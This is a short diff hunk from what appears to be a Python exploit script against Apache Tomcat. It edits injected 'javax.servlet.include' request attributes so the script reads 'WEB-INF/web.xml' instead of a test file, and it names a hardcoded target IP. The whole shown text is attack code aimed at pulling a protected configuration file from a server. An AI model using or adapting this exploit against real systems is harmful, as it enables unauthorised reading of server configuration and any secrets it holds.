@@ -95,8 +95,8 @@ class Tomcat(object):
 
 
 attributes = [
-    {"name": "req_attribute", "value": ("javax.servlet.include.request_uri", "1.txt")},
-    {"name": "req_attribute", "value": ("javax.servlet.include.path_info", "1.txt")},
+    {"name": "req_attribute", "value": ("javax.servlet.include.request_uri", "WEB-INF/web.xml")},
+    {"name": "req_attribute", "value": ("javax.servlet.include.path_info", "WEB-INF/web.xml")},
     {"name": "req_attribute", "value": ("javax.servlet.include.servlet_path", "/")},
 ]
 target = '192.168.185.191'
